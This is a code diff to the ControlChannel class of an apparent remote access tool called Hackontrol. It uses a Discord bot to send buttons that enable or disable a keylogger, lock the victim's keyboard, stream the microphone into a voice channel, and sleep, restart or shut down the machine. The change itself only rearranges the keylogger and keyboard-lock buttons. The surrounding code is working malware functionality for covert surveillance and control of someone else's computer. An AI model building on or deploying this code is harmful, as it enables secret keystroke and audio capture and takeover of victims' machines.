@@ -22,7 +22,6 @@ import com.khopan.hackontrol.utils.HackontrolError;
 import net.dv8tion.jda.api.audio.AudioSendHandler;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
-import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.managers.AudioManager;
@@ -61,7 +60,7 @@ public class ControlChannel extends HackontrolChannel {
 	public void initialize() {
 		this.channel.sendMessage("**Power Control**").addActionRow(ControlChannel.BUTTON_SLEEP, ControlChannel.BUTTON_HIBERNATE, ControlChannel.BUTTON_RESTART, ControlChannel.BUTTON_SHUTDOWN).queue();
 		this.channel.sendMessage("**Microphone Control**").addActionRow(ControlChannel.BUTTON_CONNECT, ControlChannel.BUTTON_DISCONNECT).queue();
-		this.channel.sendMessage("**KeyLogger Control**").addActionRow(ControlChannel.BUTTON_ENABLE_KEYLOGGER, ControlChannel.BUTTON_LOCK_KEYBOARD).queue();
+		this.channel.sendMessage("**KeyLogger Control**").addActionRow(ControlChannel.BUTTON_ENABLE_KEYLOGGER, ControlChannel.BUTTON_DISABLE_KEYLOGGER).addActionRow(ControlChannel.BUTTON_LOCK_KEYBOARD, ControlChannel.BUTTON_UNLOCK_KEYBOARD).queue();
 	}
 
 	@Override
@@ -80,31 +79,12 @@ public class ControlChannel extends HackontrolChannel {
 
 	private void lockKeyboard(ButtonContext context, boolean lock) {
 		NativeLibrary.Block = lock;
-		this.editButton(context);
+		context.acknowledge();
 	}
 
 	private void keylogger(ButtonContext context, boolean enable) {
 		NativeLibrary.Enable = enable;
-		this.editButton(context);
-	}
-
-	private void editButton(ButtonContext context) {
-		Button logger;
-		Button lock;
-
-		if(NativeLibrary.Enable) {
-			logger = ControlChannel.BUTTON_DISABLE_KEYLOGGER;
-		} else {
-			logger = ControlChannel.BUTTON_ENABLE_KEYLOGGER;
-		}
-
-		if(NativeLibrary.Block) {
-			lock = ControlChannel.BUTTON_UNLOCK_KEYBOARD;
-		} else {
-			lock = ControlChannel.BUTTON_LOCK_KEYBOARD;
-		}
-
-		context.getEvent().deferEdit().queue(hook -> hook.editOriginalComponents(ActionRow.of(logger, lock)).queue());
+		context.acknowledge();
 	}
 
 	private void power(ButtonContext context, PowerAction powerAction) {
